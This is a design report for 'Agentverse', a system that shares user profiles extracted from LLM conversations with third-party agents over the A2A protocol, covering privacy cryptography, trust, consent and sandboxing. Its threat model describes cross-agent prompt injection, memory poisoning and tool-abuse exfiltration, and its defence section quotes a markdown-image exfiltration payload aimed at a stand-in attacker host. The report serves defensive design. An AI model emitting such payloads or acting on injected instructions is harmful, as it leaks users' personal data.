# Agentverse: Secure Agent-to-Agent Personal Context Sharing

## Architecture Design Report — Deep Dive

*Research Date: March 15, 2026*

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [The Core Problem](#2-the-core-problem)
3. [Google A2A Protocol — Foundation Layer](#3-google-a2a-protocol--foundation-layer)
4. [Threat Model](#4-threat-model)
5. [Architecture Design](#5-architecture-design)
6. [Privacy Layer — Cryptographic Primitives](#6-privacy-layer--cryptographic-primitives)
7. [Prompt Injection Defense Architecture](#7-prompt-injection-defense-architecture)
8. [Trust & Identity Model](#8-trust--identity-model)
9. [Authorization & Consent Framework](#9-authorization--consent-framework)
10. [Sandboxing & Isolation](#10-sandboxing--isolation)
11. [MVP Implementation Roadmap](#11-mvp-implementation-roadmap)
12. [Appendix: Sources](#12-appendix-sources)

---

## 1. Executive Summary

This report presents the architecture for **Agentverse** — a CLI-first system that extracts a user's personal profile from existing LLM conversation history (Claude Code, ChatGPT, etc.) and enables privacy-preserving sharing of that profile with third-party apps and agents.

The design is built on **Google's A2A (Agent-to-Agent) protocol** as the communication foundation, extended with four additional security layers that A2A does not provide:

| Layer | What It Solves | Key Technology |
|-------|---------------|----------------|
| **Privacy** | Share attributes without exposing raw data | W3C Verifiable Credentials + BBS+ signatures → ZKP circuits (Noir) |
| **Prompt Injection Defense** | Prevent agents from manipulating each other | CaMeL capability model + Dual LLM pattern + structured data separation |
| **Trust & Identity** | Know who you're talking to, verify agents | DIDs + Agent Cards with mandatory signing + progressive trust (ATF) |
| **Authorization & Consent** | User stays in control of what's shared | OAuth 2.1 with agent extensions + ABAC + purpose-bound tokens |

The core design philosophy — learned from OpenClaw's catastrophic security failures — is: **push encrypted context out to apps, never pull agents into your data**.

---

## 2. The Core Problem

Users have spent hundreds of hours talking to LLMs. Those conversations contain a deep, implicit personal profile: skills, preferences, values, communication style, career history, interests. Today that context is:

- **Trapped** inside individual LLM providers
- **Not portable** between apps
- **Not privacy-preserving** — sharing means full exposure
- **Not verifiable** — no way to prove attributes without revealing everything

The system must solve all four problems simultaneously, while defending against:

- **External attackers** intercepting or tampering with agent communication
- **Malicious agents** trying to extract data beyond what's authorized
- **Prompt injection** where one agent manipulates another through crafted messages
- **The confused deputy problem** where a trusted agent is tricked into performing unauthorized actions

---

## 3. Google A2A Protocol — Foundation Layer

### Why A2A

A2A (v1.0, Linux Foundation, Apache 2.0) is the emerging standard for agent interoperability. Its governance includes AWS, Cisco, Google, IBM Research, Microsoft, Salesforce, SAP, and ServiceNow. It provides the communication substrate we need, but its security model has significant gaps we must fill.

### A2A Architecture (3 Layers)

```
┌─────────────────────────────────────────────────────┐
│  Layer 3: Protocol Bindings                         │
│  JSON-RPC 2.0 │ gRPC │ HTTP/REST                   │
├─────────────────────────────────────────────────────┤
│  Layer 2: Abstract Operations                       │
│  SendMessage │ GetTask │ CancelTask │ Subscribe     │
├─────────────────────────────────────────────────────┤
│  Layer 1: Canonical Data Model (Protobuf)           │
│  Tasks │ Messages │ Parts │ Artifacts │ Agent Cards │
└─────────────────────────────────────────────────────┘
```

### Key A2A Concepts We Build On

| Concept | What It Is | How We Extend It |
|---------|-----------|-----------------|
| **Agent Card** | JSON metadata at `/.well-known/agent-card.json` — name, endpoint, skills, auth schemes | Add mandatory JWS signing, DID anchoring, privacy policy declaration, capability constraints |
| **Task** | Stateful work unit (WORKING → COMPLETED/FAILED/CANCELED/REJECTED/INPUT_REQUIRED) | Add consent states: `USER_CONSENT_REQUIRED`, `PRIVACY_CHECK_REQUIRED` |
| **Message** | Communication turn with Parts (text, raw, url, data) | Enforce structured `data` Parts for inter-agent payloads — never raw text containing instructions |
| **Extensions** | Formal extension system (data-only, profile, method) with negotiation | Define privacy, consent, and security extensions |
| **Streaming** | SSE + push notifications for long-running tasks | Add encrypted streaming channels |

### Critical A2A Gaps We Must Fill

| Gap | Risk | Our Solution |
|-----|------|-------------|
| No mandatory Agent Card signing | Agent spoofing/impersonation | Mandatory JWS + DID verification |
| No message-level encryption | Data exposure if TLS is compromised | End-to-end encrypted Parts using recipient's public key |
| No consent mechanism | Data shared without user approval | `USER_CONSENT_REQUIRED` task state + consent metadata |
| No prompt injection defense | Cross-agent manipulation | CaMeL-style capability enforcement + structured data |
| No fine-grained authorization | Over-sharing of data | ABAC with purpose-bound, time-limited, field-level controls |
| No audit trail | Cannot verify what was shared | Cryptographically signed interaction logs |
| No agent reputation | Cannot assess trustworthiness | Progressive trust model with on-chain attestations |

---

## 4. Threat Model

### Actors

| Actor | Description | Capability |
|-------|-------------|-----------|
| **User** | Person whose profile is being shared | Full control over their agent and data |
| **User's Agent** | Personal CLI agent extracting/managing profile | Trusted by user, runs locally |
| **Third-Party Agent** | App/service requesting user context (e.g., Ditto AI, WeKruit) | Semi-trusted, verified identity, limited access |
| **Malicious Agent** | Attacker posing as legitimate service | May spoof Agent Cards, inject prompts, exfiltrate data |
| **Network Attacker** | MitM on communication channel | Can intercept, modify, replay messages |
| **Compromised Agent** | Legitimate agent that has been taken over | Has valid credentials but malicious intent |

### Attack Taxonomy (Ranked by Severity)

1. **Cross-agent prompt injection** — Malicious agent embeds instructions in task descriptions/artifacts that manipulate the user's agent into revealing unauthorized data. *Success rate of roleplay-based injection: 89.6%.*
2. **Agent Card spoofing** — Fake agent advertises false capabilities to attract sensitive tasks. *No mandatory signing in base A2A.*
3. **Data exfiltration via tool abuse** — Agent tricks another into calling tools with sensitive data as parameters (markdown image exfil, HTTP callbacks).
4. **Memory poisoning** — Injected content corrupts the user agent's long-term memory, creating "sleeper" compromise. *Research demonstrates this in production systems.*
5. **Confused deputy** — Trusted agent tricked into performing privileged actions on behalf of an attacker. *Central security challenge of multi-agent AI (HashiCorp, Quarkslab).*
6. **Capability hijacking** — Compromised agent inflates skill advertisements to capture disproportionate task assignments.
7. **Cascading injection** — Malicious payload introduced in one agent's output propagates to all consuming agents. *Propagates faster than incident response can contain it.*

### OpenClaw: The Anti-Pattern

OpenClaw's catastrophic failure (25,000 GitHub stars in one day → 135,000 exposed instances → 1,184+ malicious skills) provides the exact blueprint of what NOT to do:

- Authentication was optional (we make it mandatory)
- Rate limiter exempted localhost (we apply limits universally)
- Skills ran with full host access (we sandbox everything)
- No skill vetting (we require signed Agent Cards + progressive trust)
- Agents pulled into user's data (we push encrypted context out)

---

## 5. Architecture Design

### System Overview

```
┌─────────────────────────────────────────────────────────────────────┐
│                         USER'S MACHINE                              │
│                                                                     │
│  ┌──────────────┐    ┌──────────────────────────────────────────┐   │
│  │   CLI Tool    │───▶│         Personal Agent (Guardian)        │   │
│  │  agentverse   │    │                                          │   │
│  └──────────────┘    │  ┌────────────┐  ┌────────────────────┐  │   │
│                      │  │  Profile    │  │  Credential Wallet │  │   │
│  ┌──────────────┐    │  │  Extractor  │  │  (VCs + BBS+ sigs) │  │   │
│  │ LLM History  │───▶│  └────────────┘  └────────────────────┘  │   │
│  │ Claude Code  │    │                                          │   │
│  │ ChatGPT      │    │  ┌────────────┐  ┌────────────────────┐  │   │
│  │ etc.         │    │  │  Privacy    │  │  Consent Manager   │  │   │
│  └──────────────┘    │  │  Engine     │  │  (ABAC + purpose)  │  │   │
│                      │  └────────────┘  └────────────────────┘  │   │
│                      │                                          │   │
│                      │  ┌────────────┐  ┌────────────────────┐  │   │
│                      │  │  A2A Client │  │  Prompt Injection  │  │   │
│                      │  │  (outbound) │  │  Defense (CaMeL)   │  │   │
│                      │  └─────┬──────┘  └────────────────────┘  │   │
│                      └────────┼──────────────────────────────────┘   │
│                               │                                      │
└───────────────────────────────┼──────────────────────────────────────┘
                                │  A2A Protocol (HTTPS + E2E encryption)
                                │  Signed Agent Cards, Scoped OAuth tokens
                                ▼
┌───────────────────────────────────────────────────────────────────────┐
│                      THIRD-PARTY AGENTS                               │
│                                                                       │
│  ┌─────────────────┐  ┌──────────────────┐  ┌─────────────────────┐  │
│  │  Ditto AI        │  │  WeKruit          │  │  Other App Agent   │  │
│  │  (Dating)        │  │  (Recruiting)     │  │                    │  │
│  │                  │  │                   │  │                    │  │
│  │  Agent Card:     │  │  Agent Card:      │  │  Agent Card:       │  │
│  │  - Signed (JWS)  │  │  - Signed (JWS)   │  │  - Signed (JWS)    │  │
│  │  - DID anchored  │  │  - DID anchored   │  │  - DID anchored    │  │
│  │  - Skills listed │  │  - Skills listed  │  │  - Skills listed   │  │
│  │  - Privacy policy│  │  - Privacy policy │  │  - Privacy policy  │  │
│  │                  │  │                   │  │                    │  │
│  │  Receives:       │  │  Receives:        │  │  Receives:         │  │
│  │  - VP (selective │  │  - VP (selective  │  │  - VP (selective   │  │
│  │    disclosure)   │  │    disclosure)    │  │    disclosure)     │  │
│  │  - ZK proofs     │  │  - ZK proofs      │  │  - ZK proofs       │  │
│  │  - Scoped token  │  │  - Scoped token   │  │  - Scoped token    │  │
│  └─────────────────┘  └──────────────────┘  └─────────────────────┘  │
└───────────────────────────────────────────────────────────────────────┘
```

### Component Responsibilities

| Component | Role |
|-----------|------|
| **CLI Tool (`agentverse`)** | User interface — profile management, consent approvals, agent discovery |
| **Profile Extractor** | Reads LLM conversation history, produces structured profile (skills, preferences, values, experience) |
| **Credential Wallet** | Issues and stores W3C Verifiable Credentials with BBS+ signatures over profile attributes |
| **Privacy Engine** | Generates selective disclosures (VPs), ZK proofs, and (later) encrypted computations |
| **Consent Manager** | ABAC policy engine — decides what can be shared, with whom, for what purpose, until when |
| **A2A Client** | Handles A2A protocol communication — Agent Card discovery, task management, message exchange |
| **Prompt Injection Defense** | CaMeL-style capability enforcement — separates control flow from data flow, validates all incoming agent messages |

### Data Flow: Sharing Profile with Ditto AI (Example)

```
1. User runs: agentverse share --with ditto.ai --purpose dating-profile

2. CLI fetches Ditto AI's Agent Card from https://ditto.ai/.well-known/agent-card.json
   ├── Verifies JWS signature against Ditto's DID
   ├── Checks trust level (progressive trust model)
   └── Reads requested skills/attributes and privacy policy

3. Consent Manager evaluates:
   ├── What attributes does Ditto request? (interests, age_range, location_city)
   ├── What purpose? (dating-profile — matches declared purpose in Agent Card)
   ├── What duration? (30 days)
   └── User approves via CLI prompt (or pre-authorized policy)

4. Privacy Engine generates:
   ├── Verifiable Presentation with BBS+ selective disclosure
   │   └── Contains only: interests, age_range, location_city (not full profile)
   ├── ZK proof: "user.age >= 18" (without revealing exact age)
   └── Scoped OAuth token: read-only, 30-day expiry, purpose-bound

5. A2A Client sends SendMessage to Ditto's A2A endpoint:
   ├── Message contains structured data Part (not free text)
   ├── VP + ZK proofs in artifact
   ├── Token in Authorization header
   └── All Parts encrypted with Ditto's public key

6. Ditto's agent processes the VP:
   ├── Verifies BBS+ signatures (issuer = user's agent)
   ├── Verifies ZK proofs
   ├── Uses disclosed attributes for profile creation
   └── Cannot access any undisclosed attributes

7. Audit log entry created (signed, timestamped):
   └── "Shared {interests, age_range, location_city} with ditto.ai for dating-profile, expires 2026-04-14"
```

---

## 6. Privacy Layer — Cryptographic Primitives

### Phased Approach (MVP → Full)

The cryptographic privacy layer is built in three phases, ordered by implementation complexity and practical necessity:

### Phase 1: Verifiable Credentials + BBS+ Selective Disclosure (MVP)

**What**: Issue W3C VC 2.0 credentials over user profile attributes, signed with BBS+ signatures. The user's agent creates Verifiable Presentations that selectively disclose only requested attributes.

**Why BBS+ first**: Sub-millisecond verification, W3C standardized (`bbs-2023` cryptosuite), natively supports selective disclosure and unlinkable proofs, no ZK circuit development required.

**How it works**:
```
Profile Extraction          Credential Issuance           Selective Disclosure
┌──────────────┐           ┌───────────────────┐         ┌───────────────────┐
│ LLM History  │──extract─▶│ BBS+ signed VC    │──share─▶│ VP with only      │
│              │           │                   │         │ requested claims  │
│ "I have 7y   │           │ claims:           │         │                   │
│  Python exp, │           │  python_years: 7  │         │ Disclosed:        │
│  love hiking,│           │  hobbies: [hiking]│         │  python_years: 7  │
│  based in SF"│           │  city: SF         │         │                   │
│              │           │  age: 28          │         │ Hidden:           │
└──────────────┘           │  ...              │         │  hobbies, city,   │
                           └───────────────────┘         │  age, ...         │
                                                         └───────────────────┘
```

**Libraries**:
- `@mattrglobal/bbs-signatures` (JavaScript/TypeScript)
- `jsonld-signatures-bbs` (JSON-LD integration)
- W3C Data Integrity BBS Cryptosuites v1.0

### Phase 2: Zero-Knowledge Proofs for Predicate Verification

**What**: Build ZK circuits for proving predicates over profile attributes without revealing the underlying values.

**Why**: BBS+ handles selective disclosure ("show this field"), but ZKPs handle predicate proofs ("prove this field meets a condition"). Examples:
- "User has ≥5 years Python experience" without revealing the exact number
- "User is in the SF Bay Area" without revealing the exact city
- "User's interests overlap with {hiking, cooking, travel}" without revealing all interests

**Recommended framework**: **Noir** (Rust-like DSL, backend-agnostic via ACIR compilation, best developer experience, formal verification available via NAVe, used by ZKPassport for real-world attribute proofs).

**Performance**: For simple attribute predicates (comparisons, range proofs, set membership):
- Proof generation: **100ms–2s** on modern hardware
- Verification: **<1ms** (Groth16)
- Acceptable for agent-to-agent interactions that tolerate slight latency

**Circuit examples** (pseudocode):
```noir
// Prove experience >= threshold without revealing exact years
fn main(
    experience_years: Field,  // private witness
    threshold: pub Field,     // public input
    credential_hash: pub Field // public - links to VC
) {
    assert(experience_years >= threshold);
    assert(hash(experience_years) == credential_hash);
}
```

### Phase 3: Encrypted Computation (Future)

**What**: Enable third-party agents to compute on encrypted profile data (e.g., compatibility scoring on encrypted profiles).

**Options** (in order of current practicality):

| Approach | Best For | Latency | Library |
|----------|---------|---------|---------|
| **MPC (2-party)** | Joint computation between user agent + service | Seconds | CrypTen (PyTorch-native) |
| **MPC (N-party)** | Multi-agent collaboration | Seconds–minutes | MP-SPDZ (30 protocol variants) |
| **FHE** | Single-party computation on encrypted data | Minutes (improving) | Concrete ML (Zama) — Python, GPU-accelerated |

**Current reality**: FHE overhead is 10,000x–1,000,000x over plaintext on CPUs. Hardware acceleration (Intel Heracles: 5,000x speedup) is changing this, but not yet widely available. **MPC is more practical today for interactive use cases.**

**AgentCrypt tiered model** (NeurIPS 2025) provides the architectural guide:
1. Level 1: Unrestricted data exchange
2. Level 2: Encrypted transport (TLS — baseline)
3. Level 3: Selective disclosure with access controls ← **Our MVP**
4. Level 4: Full computation over encrypted data ← **Phase 3 target**

---

## 7. Prompt Injection Defense Architecture

### Why This Is Critical

Prompt injection is the **#1 LLM vulnerability** (OWASP 2025/2026). OpenAI has admitted it "may never be fully solved" for browsing agents. In agent-to-agent communication, the risk is amplified:

- One compromised agent can corrupt an entire mesh through poisoned messages
- Malicious prompts embedded in Agent Card fields, task descriptions, and artifacts
- 5.5% of MCP servers exhibit tool poisoning attacks
- Adaptive attacks bypass >90% of published AI-based defenses

### Our Defense: CaMeL-Inspired Capability Architecture

We adopt the architectural principles from **CaMeL** (Google DeepMind, 2025) — traditional security principles (control flow integrity, access control, information flow control) enforced mechanically, NOT by asking another LLM to judge safety.

**Core principle**: *Once an LLM agent has ingested untrusted input, it must be constrained so that input cannot trigger any consequential actions.*

```
┌──────────────────────────────────────────────────────────────┐
│                    GUARDIAN AGENT                              │
│                                                               │
│  ┌──────────────────┐     ┌──────────────────────────────┐   │
│  │  TRUSTED ZONE     │     │  QUARANTINED ZONE             │   │
│  │  (Privileged LLM) │     │  (Restricted LLM)             │   │
│  │                   │     │                               │   │
│  │  - Sees system    │     │  - Processes incoming A2A     │   │
│  │    prompt only    │     │    messages from other agents  │   │
│  │  - Plans actions  │     │  - NO tool access             │   │
│  │  - Has tool access│     │  - NO capability tokens       │   │
│  │  - Writes VPs     │     │  - Extracts structured data   │   │
│  │                   │     │    from agent messages         │   │
│  │                   │     │  - Output is DATA ONLY         │   │
│  └────────┬─────────┘     └──────────┬────────────────────┘   │
│           │                          │                        │
│           │    ┌─────────────┐       │                        │
│           └───▶│  CAPABILITY  │◀──────┘                        │
│                │  ENFORCER    │                                │
│                │              │                                │
│                │  - Validates │                                │
│                │    all tool  │                                │
│                │    calls     │                                │
│                │  - Checks    │                                │
│                │    data flow │                                │
│                │    policies  │                                │
│                │  - Blocks    │                                │
│                │    exfil     │                                │
│                └─────────────┘                                │
└──────────────────────────────────────────────────────────────┘
```

### The Six Defense Patterns Applied

We implement the six design patterns from Beurer-Kellner et al. (2025):

| Pattern | How We Apply It |
|---------|----------------|
| **Dual LLM** | Privileged LLM (trusted, has tools) never sees untrusted agent messages. Quarantined LLM (no tools) processes all external input. |
| **Plan-Then-Execute** | The privileged LLM pre-approves a plan (e.g., "share {interests, age_range} with ditto.ai"). Any action not in the plan is blocked. |
| **Context Minimization** | After extracting structured data from an agent's message, the raw message is discarded — the privileged LLM never sees it. |
| **Structured Data Separation** | All inter-agent payloads use A2A `data` Parts (structured JSON), never free-text `text` Parts. Instructions and data are in separate channels. |
| **Action-Selector** | When selecting which agent to interact with, the LLM never sees output from previous agent interactions — preventing feedback loops. |
| **Map-Reduce** | When processing messages from multiple agents, each is handled by an isolated LLM instance — preventing cross-contamination. |

### Concrete Defenses

1. **Structured-only inter-agent communication**: All A2A messages between agents use `data` Parts with JSON schema validation. Free-text `text` Parts from external agents are treated as untrusted display content only — never parsed for instructions.

2. **Agent Card validation pipeline**:
   ```
   Fetch Agent Card → Verify JWS signature → Resolve DID → Check trust level
   → Validate skill descriptions against known-safe patterns → Accept/Reject
   ```

3. **Canary tokens**: Unique markers in the user's profile data. If any appear in outbound messages to unexpected recipients, the system flags a data exfiltration attempt.

4. **Output filtering**: All outbound data is validated against the consent policy. The Capability Enforcer blocks any data flow not explicitly authorized.

5. **No markdown/HTML rendering of external content**: Prevents image-based data exfiltration (`![](https://attacker.com/steal?data=...)`).

---

## 8. Trust & Identity Model

### Agent Identity: DIDs + Signed Agent Cards

Every agent in the ecosystem has a **Decentralized Identifier (DID)** that:
- Is self-controlled (no central authority)
- Contains no PII (privacy-preserving by design)
- Supports key rotation without a certificate authority
- Anchors the agent's A2A Agent Card

```
┌─────────────────────────────────────────────────┐
│                 Agent Card (Extended)             │
│                                                  │
│  Standard A2A fields:                            │
│    name, url, skills, capabilities,              │
│    authentication, extensions                    │
│                                                  │
│  Agentverse extensions:                          │
│    did: "did:web:ditto.ai:agent"                 │
│    signature: { /* JWS over entire card */ }     │
│    privacy_policy: {                             │
│      data_retention: "30d",                      │
│      purpose: ["dating-profile"],                │
│      third_party_sharing: false,                 │
│      deletion_endpoint: "/user-data/delete"      │
│    }                                             │
│    trust_level: "verified"                       │
│    attestations: [                               │
│      { issuer: "did:web:trustregistry.org",      │
│        type: "SecurityAuditPass",                │
│        date: "2026-03-01" }                      │
│    ]                                             │
│    required_credentials: [                       │
│      { type: "ProfileVC",                        │
│        claims: ["interests", "age_range"],        │
│        predicates: ["age >= 18"] }               │
│    ]                                             │
└─────────────────────────────────────────────────┘
```

### Progressive Trust Model (CSA Agentic Trust Framework)

Agents earn trust through demonstrated behavior, not just identity verification:

```
Level 0: UNKNOWN        — No interaction history, unverified Agent Card
    │                      Access: None
    ▼
Level 1: IDENTIFIED     — Valid DID, signed Agent Card, verified endpoint
    │                      Access: Can request public profile summary only
    ▼
Level 2: VERIFIED       — Security audit attestation, known operator
    │                      Access: Can request specific attributes via VP
    ▼
Level 3: TRUSTED        — Track record of compliant interactions, user approval
    │                      Access: Can request sensitive attributes, ZK proofs
    ▼
Level 4: PRIVILEGED     — Extended relationship, pre-authorized policies
                           Access: Can receive encrypted data for computation
```

**Promotion gates** (each level requires):
- Demonstrated accuracy in prior interactions
- Security audit passage (attestation from trusted auditor)
- Clean operational history (no policy violations)
- Explicit user approval for promotion

### Agent Discovery & Verification Flow

```
1. User requests: "share profile with ditto.ai"

2. Fetch Agent Card:
   GET https://ditto.ai/.well-known/agent-card.json

3. Verify signature:
   ├── Extract JWS from card
   ├── Resolve DID: did:web:ditto.ai:agent
   ├── Fetch DID Document (contains public keys)
   └── Verify JWS signature against DID public key

4. Check trust level:
   ├── Look up local trust store for prior interactions
   ├── Check attestations (security audit, known operator)
   └── Determine access level

5. If trust insufficient:
   ├── Inform user: "Ditto AI is at trust level IDENTIFIED (Level 1)"
   ├── Show: what they're requesting vs. what Level 1 allows
   └── User can: approve one-time exception, or promote trust level
```

---

## 9. Authorization & Consent Framework

### OAuth 2.1 with Agent Extensions

We adopt the emerging IETF standards for agent authorization:

- **`draft-oauth-ai-agents-on-behalf-of-user`**: Extends OAuth 2.0 Authorization Code Grant with `requested_actor` (identifies the agent) and `actor_token` (authenticates the agent). Resulting tokens capture user, agent, and client application identities.
- **AAuth (Agentic Authorization)**: OAuth 2.1 extension defining the Agent Authorization Grant.

### Token Design

```json
{
  "iss": "did:web:user.agentverse.local",
  "sub": "did:web:ditto.ai:agent",
  "aud": "https://ditto.ai/a2a",
  "iat": 1710489600,
  "exp": 1713081600,
  "scope": "profile:read:interests,age_range,location_city",
  "purpose": "dating-profile",
  "purpose_binding": true,
  "delegator": "did:web:user.agentverse.local",
  "actor": "did:web:ditto.ai:agent",
  "constraints": {
    "max_requests": 100,
    "no_third_party_sharing": true,
    "deletion_required_on_expiry": true
  }
}
```

### ABAC Policy Engine

The Consent Manager implements Attribute-Based Access Control:

```yaml
# Example policy: Ditto AI dating profile
policy:
  agent: "did:web:ditto.ai:agent"
  purpose: "dating-profile"

  allow:
    attributes:
      - interests
      - age_range          # range, not exact age
      - location_city
    predicates:
      - "age >= 18"        # ZK proof, no exact age

  deny:
    attributes:
      - exact_age
      - full_name
      - email
      - employment_history
      - salary
      - health_data

  constraints:
    duration: 30d
    max_requests: 100
    third_party_sharing: false
    retention_after_expiry: delete

  audit:
    log_all_access: true
    notify_on_anomaly: true
```

### Consent Flow

```
┌──────┐     ┌──────────────┐     ┌────────────┐     ┌────────────┐
│ User │     │ CLI (agentverse)│   │ Consent Mgr│     │ Third-Party│
└──┬───┘     └──────┬───────┘     └─────┬──────┘     └─────┬──────┘
   │                │                    │                   │
   │  share --with  │                    │                   │
   │  ditto.ai      │                    │                   │
   │───────────────▶│                    │                   │
   │                │  fetch Agent Card  │                   │
   │                │───────────────────────────────────────▶│
   │                │                    │   Agent Card      │
   │                │◀───────────────────────────────────────│
   │                │  evaluate policy   │                   │
   │                │───────────────────▶│                   │
   │                │  consent required  │                   │
   │                │◀───────────────────│                   │
   │  Ditto AI      │                    │                   │
   │  wants:        │                    │                   │
   │  - interests   │                    │                   │
   │  - age_range   │                    │                   │
   │  - location    │                    │                   │
   │  Approve? [y/n]│                    │                   │
   │◀───────────────│                    │                   │
   │  y             │                    │                   │
   │───────────────▶│  record consent    │                   │
   │                │───────────────────▶│                   │
   │                │  generate VP + ZKP │                   │
   │                │  + scoped token    │                   │
   │                │                    │                   │
   │                │  A2A SendMessage   │                   │
   │                │  (VP + proofs)     │                   │
   │                │───────────────────────────────────────▶│
   │                │                    │   Task: COMPLETED │
   │                │◀───────────────────────────────────────│
   │  Shared with   │                    │                   │
   │  Ditto AI ✓    │                    │                   │
   │◀───────────────│                    │                   │
```

---

## 10. Sandboxing & Isolation

### Agent Execution Isolation

When the user's agent processes responses from third-party agents, the quarantined LLM runs in an isolated environment:

| Layer | Technology | Purpose |
|-------|-----------|---------|
| **Process isolation** | gVisor (user-space kernel) | Syscall interception, memory isolation — used by Anthropic for their web sandbox |
| **Network isolation** | Explicit allowlist | Only pre-approved endpoints reachable from quarantined zone |
| **Resource limits** | cgroups v2 | Hard CPU, memory, I/O limits — hypervisor terminates on exceed |
| **File system** | Read-only rootfs | Quarantined LLM cannot write to disk |

### Why gVisor Over Firecracker

For a CLI tool running on user machines, gVisor provides the best tradeoff:
- Fast startup (no full VM boot)
- Lower resource overhead than MicroVMs
- Strong isolation (dedicated user-space kernel per sandbox)
- Used by Anthropic at thousands of concurrent sandboxes
- Kubernetes-compatible for future cloud deployment

### Memory Isolation Between Sessions

Each interaction with a different third-party agent runs in a separate sandbox instance. No shared memory, no shared state, no cross-contamination. This prevents:
- Agent A's response from influencing Agent B's processing
- Cascading prompt injection across agent sessions
- Side-channel information leakage between agents

---

## 11. MVP Implementation Roadmap

### Phase 1: Core Profile + BBS+ Selective Disclosure (Weeks 1–6)

**Goal**: Extract profile from LLM history, issue VCs, share via A2A with selective disclosure.

| Component | What to Build | Tech Stack |
|-----------|--------------|-----------|
| CLI tool | `agentverse` command-line interface | TypeScript, Commander.js |
| Profile Extractor | Parse Claude Code JSONL, ChatGPT export JSON → structured profile | TypeScript, Zod schema validation |
| Credential Wallet | Issue BBS+ signed VCs over profile attributes | `@mattrglobal/bbs-signatures`, `jsonld-signatures-bbs` |
| Privacy Engine (v1) | Generate Verifiable Presentations with selective disclosure | W3C VC Data Integrity |
| A2A Client | Agent Card discovery, SendMessage, basic task lifecycle | HTTP client, JSON-RPC 2.0 |
| Consent Manager (v1) | Simple approve/deny per request, audit log | YAML policy files |

**Security baseline for Phase 1**:
- Mandatory Agent Card JWS verification
- Structured `data` Parts only (no free-text processing)
- All communication over HTTPS
- Local audit log of all sharing events

### Phase 2: ZKP Predicates + Prompt Injection Defense (Weeks 7–12)

**Goal**: Add ZK proof generation for attribute predicates, implement CaMeL-style defense.

| Component | What to Build | Tech Stack |
|-----------|--------------|-----------|
| ZKP Engine | Noir circuits for common predicates (range proofs, set membership, threshold comparisons) | Noir, Barretenberg backend |
| Dual LLM Defense | Trusted/quarantined LLM split, capability enforcer | Process-level isolation |
| Agent Card Extensions | DID anchoring, privacy policy declaration, attestation fields | `did:web` method, JWS |
| Consent Manager (v2) | ABAC policies, purpose-binding, time-limited tokens | OPA/Rego policy engine |
| Trust Store | Progressive trust tracking, interaction history | SQLite (local) |

### Phase 3: Advanced Privacy + Ecosystem (Weeks 13–20)

**Goal**: Encrypted computation, agent reputation, ecosystem growth.

| Component | What to Build | Tech Stack |
|-----------|--------------|-----------|
| MPC Engine | 2-party computation for compatibility scoring | CrypTen (PyTorch) |
| FHE Engine (experimental) | Simple encrypted computations on profile vectors | Concrete ML (Zama) |
| Reputation System | On-chain attestations for agent behavior | ERC-8004 or similar |
| Sandbox | gVisor-based isolation for quarantined LLM | gVisor, cgroups v2 |
| Agent SDK | SDK for third-party agents to integrate with Agentverse | TypeScript/Python |

### Key Design Decisions for MVP

| Decision | Choice | Rationale |
|----------|--------|-----------|
| **Start with BBS+ VCs, not ZKPs** | Phase 1 | BBS+ is standardized, sub-ms verification, no circuit development; ZKPs add predicates in Phase 2 |
| **Structured data only, no free text** | All phases | Eliminates the primary prompt injection vector — instruction/data separation |
| **Mandatory Agent Card signing** | Phase 1 | Prevents spoofing from day one; unsigned cards are rejected |
| **gVisor over Firecracker** | Phase 3 | Better for CLI tool on user machines; lower overhead |
| **MPC before FHE** | Phase 3 | MPC has lower latency for interactive computation today |
| **did:web over blockchain DIDs** | Phase 1 | Simple, DNS-based, no blockchain dependency; can migrate later |
| **Local-first architecture** | All phases | Profile and credentials never leave user's machine unless explicitly shared |

---

## 12. Appendix: Sources

### Google A2A Protocol
- [A2A Protocol Official Specification v1.0](https://a2a-protocol.org/latest/specification/)
- [A2A GitHub Repository](https://github.com/a2aproject/A2A)
- [Google Developers Blog — A2A Announcement](https://developers.googleblog.com/en/a2a-a-new-era-of-agent-interoperability/)
- [Semgrep — A Security Engineer's Guide to A2A](https://semgrep.dev/blog/2025/a-security-engineers-guide-to-the-a2a-protocol/)
- [CSA — Threat Modeling A2A with MAESTRO Framework](https://cloudsecurityalliance.org/blog/2025/04/30/threat-modeling-google-s-a2a-protocol-with-the-maestro-framework)
- [Improving A2A Protocol: Protecting Sensitive Data (arXiv:2505.12490)](https://arxiv.org/html/2505.12490v3)

### Prompt Injection Research
- [OWASP LLM01:2025 Prompt Injection](https://genai.owasp.org/llmrisk/llm01-prompt-injection/)
- [CaMeL: Defeating Prompt Injections by Design (arXiv:2503.18813)](https://arxiv.org/abs/2503.18813)
- [Design Patterns for Securing LLM Agents (arXiv:2506.08837)](https://arxiv.org/abs/2506.08837)
- [OpenAI: The Instruction Hierarchy (arXiv:2404.13208)](https://arxiv.org/html/2404.13208v1)
- [Anthropic: Mitigating Prompt Injection in Browser Use](https://www.anthropic.com/research/prompt-injection-defenses)
- [Trail of Bits: Prompt Injection to RCE in AI Agents](https://blog.trailofbits.com/2025/10/22/prompt-injection-to-rce-in-ai-agents/)
- [MASpi: Multi-Agent System Prompt Injection Evaluation](https://openreview.net/forum?id=1khmNRuIf9)

### Cryptographic Primitives
- [W3C Verifiable Credentials 2.0](https://www.w3.org/press-releases/2025/verifiable-credentials-2-0/)
- [W3C Data Integrity BBS Cryptosuites v1.0](https://www.w3.org/TR/vc-di-bbs/)
- [BBS Signatures — Privacy by Design (MATTR)](https://mattr.global/article/bbs-signatures---a-building-block-for-privacy-by-design)
- [Noir Documentation](https://noir-lang.org/docs/)
- [AgentCrypt: Privacy in AI Agent Collaboration (NeurIPS 2025)](https://arxiv.org/abs/2512.08104)
- [AI Agents with DIDs and VCs (arXiv:2511.02841)](https://arxiv.org/html/2511.02841v1)
- [Privacy Stack: ZK vs FHE vs TEE vs MPC Comparison](https://blockeden.xyz/blog/2026/01/27/privacy-infrastructure-zk-fhe-tee-mpc-comparison-benchmarks/)

### Agent Security Architecture
- [OWASP Top 10 for Agentic Applications 2026](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/)
- [CSA Agentic Trust Framework](https://cloudsecurityalliance.org/blog/2026/02/02/the-agentic-trust-framework-zero-trust-governance-for-ai-agents)
- [Systems Security Foundations for Agentic Computing (arXiv:2512.01295)](https://arxiv.org/abs/2512.01295)
- [MiniScope: Least Privilege for Tool-Calling Agents (arXiv:2512.11147)](https://arxiv.org/abs/2512.11147)
- [Progent: Programmable Privilege Control (arXiv:2504.11703)](https://arxiv.org/abs/2504.11703)
